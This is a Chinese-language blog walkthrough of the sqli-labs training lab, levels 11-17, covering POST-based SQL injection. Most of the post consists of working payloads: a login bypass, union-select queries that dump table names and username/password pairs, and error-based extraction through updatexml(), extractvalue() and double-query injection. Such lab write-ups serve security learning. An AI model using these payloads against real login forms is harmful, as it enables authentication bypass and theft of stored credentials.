@@ -1,0 +1,423 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>sqli-labs靶场(2)POST - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="sqli-labs靶场(2)POST" />
+<meta property="og:description" content="sqli-labs靶场精简记录11-17" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/sqli-labs_2_post/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-17T00:12:00+08:00" />
+<meta property="article:modified_time" content="2023-11-17T00:12:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="sqli-labs靶场(2)POST"/>
+<meta name="twitter:description" content="sqli-labs靶场精简记录11-17"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/sqli-labs_2_post/" /><link rel="prev" href="http://scofield1920.github.io/sqli-labs_3_post_head/" /><link rel="next" href="http://scofield1920.github.io/sqli-labs_1_get/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "sqli-labs靶场(2)POST",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/sqli-labs_2_post\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "web, wp, sqli","wordcount":  297 ,
+        "url": "http:\/\/scofield1920.github.io\/sqli-labs_2_post\/","datePublished": "2023-11-17T00:12:00+08:00","dateModified": "2023-11-17T00:12:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-11-post---error-based---single-quotes--string">Less-11 POST - Error Based - Single quotes- String</a></li>
+        <li><a href="#less-12-post---error-based---double-quotes--string-with-twist">Less-12 POST - Error Based - Double quotes- String-with twist</a></li>
+        <li><a href="#less-13-post---double-injection---single-quotes--string--twist">Less-13 POST - Double Injection - Single quotes- String -twist</a></li>
+        <li><a href="#less-14-post---double-injection---single-quotes--string--twist">Less-14 POST - Double Injection - Single quotes- String -twist</a></li>
+        <li><a href="#less-15-post---blind--booliantime-based---single-quotes">less-15 POST - Blind- Boolian/time Based - Single quotes</a></li>
+        <li><a href="#less-16-post---blind--booliantime-based---double-quotes">Less-16 POST - Blind- Boolian/Time Based - Double quotes</a></li>
+        <li><a href="#less-17-post---update-query--error-based---string">Less-17 POST - Update Query- Error Based - String</a>
+          <ul>
+            <li><a href="#子查询注入">子查询注入</a></li>
+            <li><a href="#updatexml函数">updatexml()函数</a></li>
+            <li><a href="#extractvalue函数">extractvalue()函数</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">sqli-labs靶场(2)POST</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a>&nbsp;<a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>Wp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;297 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-11-post---error-based---single-quotes--string">Less-11 POST - Error Based - Single quotes- String</a></li>
+        <li><a href="#less-12-post---error-based---double-quotes--string-with-twist">Less-12 POST - Error Based - Double quotes- String-with twist</a></li>
+        <li><a href="#less-13-post---double-injection---single-quotes--string--twist">Less-13 POST - Double Injection - Single quotes- String -twist</a></li>
+        <li><a href="#less-14-post---double-injection---single-quotes--string--twist">Less-14 POST - Double Injection - Single quotes- String -twist</a></li>
+        <li><a href="#less-15-post---blind--booliantime-based---single-quotes">less-15 POST - Blind- Boolian/time Based - Single quotes</a></li>
+        <li><a href="#less-16-post---blind--booliantime-based---double-quotes">Less-16 POST - Blind- Boolian/Time Based - Double quotes</a></li>
+        <li><a href="#less-17-post---update-query--error-based---string">Less-17 POST - Update Query- Error Based - String</a>
+          <ul>
+            <li><a href="#子查询注入">子查询注入</a></li>
+            <li><a href="#updatexml函数">updatexml()函数</a></li>
+            <li><a href="#extractvalue函数">extractvalue()函数</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>sqli-labs靶场精简记录11-17</p>
+<h3 id="less-11-post---error-based---single-quotes--string" class="headerLink">
+    <a href="#less-11-post---error-based---single-quotes--string" class="header-mark"></a>Less-11 POST - Error Based - Single quotes- String</h3><p>基于错误的POST型单引号字符型注入</p>
+<p>万能密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname=1&#39; or 1=1# &amp; passwd=1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname=-1&#39; union select 1,database() # &amp; passwd=1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uname=-1&#39; union select 1,group_concat(schema_name) from information_schema.schemata # &amp; passwd=1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uname=-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# &amp; passwd=1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uname=-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;# &amp; passwd=1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uname=-1&#39; union select 1,group_concat(username,&#34;|||&#34;,password) from users# &amp; passwd=1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-12-post---error-based---double-quotes--string-with-twist" class="headerLink">
+    <a href="#less-12-post---error-based---double-quotes--string-with-twist" class="header-mark"></a>Less-12 POST - Error Based - Double quotes- String-with twist</h3><p>基于错误的双引号POST型字符型变形的注入</p>
+<p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname=admin&#34; &amp; passwd=admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-13-post---double-injection---single-quotes--string--twist" class="headerLink">
+    <a href="#less-13-post---double-injection---single-quotes--string--twist" class="header-mark"></a>Less-13 POST - Double Injection - Single quotes- String -twist</h3><p>POST单引号变形双注入</p>
+<p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname=admin&#39;) &amp; passwd=admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-14-post---double-injection---single-quotes--string--twist" class="headerLink">
+    <a href="#less-14-post---double-injection---single-quotes--string--twist" class="header-mark"></a>Less-14 POST - Double Injection - Single quotes- String -twist</h3><p>POST单引号变形双注入</p>
+<p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname=admin&#34; &amp; passwd=admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-15-post---blind--booliantime-based---single-quotes" class="headerLink">
+    <a href="#less-15-post---blind--booliantime-based---single-quotes" class="header-mark"></a>less-15 POST - Blind- Boolian/time Based - Single quotes</h3><p>基于bool型/时间延迟单引号POST型盲注</p>
+<p>源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。</p>
+<p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname=admin&#39; &amp; passwd=admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-16-post---blind--booliantime-based---double-quotes" class="headerLink">
+    <a href="#less-16-post---blind--booliantime-based---double-quotes" class="header-mark"></a>Less-16 POST - Blind- Boolian/Time Based - Double quotes</h3><p>基于bool型/时间延迟的双引号POST型盲注</p>
+<p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname=admin&#34;) &amp; passwd=admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-17-post---update-query--error-based---string" class="headerLink">
+    <a href="#less-17-post---update-query--error-based---string" class="header-mark"></a>Less-17 POST - Update Query- Error Based - String</h3><p>基于错误的更新查询POST注入</p>
+<p>审计后端代码，发现uname被check_input包裹了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//making sure uname is not injectable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$uname=check_input($_POST[&#39;uname&#39;]);  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$passwd=$_POST[&#39;passwd&#39;];
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">$update=&#34;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&#34;;
+</span></span><span class="line"><span class="cl">			print_r(mysql_error());
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注入点是在 update 语句里面，输出了报错日志</p>
+<h4 id="子查询注入" class="headerLink">
+    <a href="#%e5%ad%90%e6%9f%a5%e8%af%a2%e6%b3%a8%e5%85%a5" class="header-mark"></a>子查询注入</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//查用户名
+</span></span><span class="line"><span class="cl">uname=Dumb&amp;passwd=1&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select user()),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#39;Dumb&#39; -- #
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//查数据库
+</span></span><span class="line"><span class="cl">uname=Dumb&amp;passwd=1&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#39;Dumb&#39; -- #
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="updatexml函数" class="headerLink">
+    <a href="#updatexml%e5%87%bd%e6%95%b0" class="header-mark"></a>updatexml()函数</h4><p>updatexml 最大爆 32 个字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname=Dumb&amp;passwd=1&#39; and updatexml(1,concat(&#39;#&#39;,(database())),0) -- #
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uname=Dumb&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) -- #
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uname=Dumb&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;),0x7e),1) -- #
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uname=Dumb&amp;passwd=1&#39; and updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0) -- #
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="extractvalue函数" class="headerLink">
+    <a href="#extractvalue%e5%87%bd%e6%95%b0" class="header-mark"></a>extractvalue()函数</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname=Dumb&amp;passwd=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- #
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-11-17</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/sqli-labs_2_post/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\sqli-labs_2_post.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\sqli-labs_2_post.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20sqli-labs%E9%9D%B6%E5%9C%BA%282%29POST&body=|Field|Value|%0A|-|-|%0A|Title|sqli-labs%E9%9D%B6%E5%9C%BA%282%29POST|%0A|Url|http://scofield1920.github.io/sqli-labs_2_post/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\sqli-labs_2_post.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/sqli-labs_2_post/" data-title="sqli-labs靶场(2)POST" data-hashtags="web,wp,sqli"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/sqli-labs_2_post/" data-hashtag="web"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/sqli-labs_2_post/" data-title="sqli-labs靶场(2)POST"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/sqli-labs_2_post/" data-title="sqli-labs靶场(2)POST"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/sqli-labs_2_post/" data-title="sqli-labs靶场(2)POST"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/sqli-labs_2_post/" data-title="sqli-labs靶场(2)POST" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;sqli-labs靶场(2)POST&#34;, &#34;http://scofield1920.github.io/sqli-labs_2_post/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/wp/">Wp</a>,&nbsp;<a href="/tags/sqli/">Sqli</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/sqli-labs_3_post_head/" class="prev" rel="prev" title="sqli-labs靶场(3)POST头部"><i class="fas fa-angle-left fa-fw"></i>sqli-labs靶场(3)POST头部</a>
+            <a href="/sqli-labs_1_get/" class="next" rel="next" title="sqli-labs靶场(1)GET型">sqli-labs靶场(1)GET型<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
